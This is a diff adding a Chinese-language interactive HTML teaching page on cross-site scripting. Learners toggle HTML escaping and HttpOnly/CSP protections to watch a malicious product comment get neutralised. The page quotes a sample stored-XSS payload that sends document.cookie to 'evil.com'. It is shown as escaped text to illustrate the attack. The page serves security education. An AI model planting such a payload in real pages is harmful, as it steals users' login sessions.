@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>玩具 03：XSS 跨站脚本攻防与转义护盾</title>
+  <link rel="stylesheet" href="../../../shared/toy-base.css" />
+  <script src="../../../shared/toy-sdk.js"></script>
+  <style>
+    .checks { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 14px; }
+    @media (max-width: 700px) { .checks { grid-template-columns: 1fr; } }
+    .chk { display: flex; align-items: center; gap: 10px; padding: 12px; border-radius: 12px; background: var(--tax-surface-alt); border: 1.5px solid var(--tax-border); font-weight: 800; font-size: 13.5px; cursor: pointer; }
+    .preview { padding: 16px; border-radius: 14px; background: var(--tax-surface-alt); border: 1.5px solid var(--tax-border); font-size: 14px; line-height: 1.65; }
+  </style>
+</head>
+<body class="tax-toy">
+  <div class="tax-wrap">
+    <div class="tax-topbar">
+      <div>
+        <h1>🧹 XSS 跨站脚本（Cross-Site Scripting）：一条商品评论怎么偷走全站用户的登录 Cookie？</h1>
+        <p>黑客在评论区提交了：<code>好物推荐！&lt;script&gt;fetch('evil.com/?c='+document.cookie)&lt;/script&gt;</code>。勾选下方安全护盾，看看如何把脚本彻底缴械！</p>
+      </div>
+      <a class="tax-back" href="./index.html">← 返回主题目录</a>
+    </div>
+
+    <div class="tax-panel">
+      <div class="checks">
+        <label class="chk"><input type="checkbox" id="cEsc" onchange="render()" /> 🧼 开启 HTML 实体转义（把 &lt; 变成 &amp;lt; / 用 textContent）</label>
+        <label class="chk"><input type="checkbox" id="cHttp" onchange="render()" /> 🍪 开启 HttpOnly Cookie + CSP 内容安全策略</label>
+      </div>
+      <div class="preview" id="prevBox"></div>
+    </div>
+
+    <div class="tax-aha" id="ahaBox"></div>
+  </div>
+
+  <script>
+    function render() {
+      const esc = document.getElementById("cEsc").checked;
+      const http = document.getElementById("cHttp").checked;
+
+      if (esc && http) {
+        document.getElementById("prevBox").innerHTML = "✅ <strong>纵深防御全开：</strong><br>1. 评论区只原样显示无害纯文本 <code>好物推荐！&lt;script&gt;...&lt;/script&gt;</code>，浏览器绝不执行；<br>2. 即使别处漏了转义，<code>HttpOnly</code> 也会让 JS 根本读不到登录 Cookie！";
+        document.getElementById("ahaBox").innerHTML = "💡 <strong>Web 前端安全的双保险：</strong>第一道防线是<strong>永远不要用 <code>innerHTML</code> 直接渲染用户输入</strong>（React/Vue 默认自动转义）；第二道防线是给敏感 Cookie 加上 <strong>HttpOnly</strong> 与 <strong>CSP</strong>，把脚本偷家之路彻底焊死！";
+        if (window.ToySDK) window.ToySDK.markCompleted();
+      } else if (esc) {
+        document.getElementById("prevBox").innerHTML = "🟡 <strong>脚本已被驯化成纯文本！</strong>评论区安全渲染，不再执行恶意代码。建议同时勾上 HttpOnly + CSP 实现纵深防御。";
+        document.getElementById("ahaBox").innerHTML = "💡 <strong>HTML 转义立功：</strong>把尖括号 <code>&lt;</code> 转义为 <code>&amp;lt;</code> 后，浏览器只把它当普通字符画在屏幕上，不会当成标签执行！";
+      } else if (http) {
+        document.getElementById("prevBox").innerHTML = "🟠 <strong>Cookie 没被偷走，但恶意脚本仍在弹窗搞破坏！</strong>因为没做 HTML 转义，脚本依然执行了。";
+        document.getElementById("ahaBox").innerHTML = "💡 <strong>还差第一道防线：</strong>请同时勾上 <strong>🧼 开启 HTML 实体转义</strong>，从源头禁止评论区执行脚本！";
+      } else {
+        document.getElementById("prevBox").innerHTML = "💥 <strong style='color:var(--tax-red)'>XSS 中招！</strong>网站用 <code>innerHTML</code> 直接把黑客评论塞进页面，所有点开这条评论的用户浏览器都自动执行了脚本，登录 Cookie 瞬间被偷发给黑客！";
+        document.getElementById("ahaBox").innerHTML = "💡 <strong>顿悟时刻：</strong>勾选上方两道 Web 防线，把恶意脚本彻底关进笼子！";
+      }
+    }
+    render();
+  </script>
+</body>
+</html>
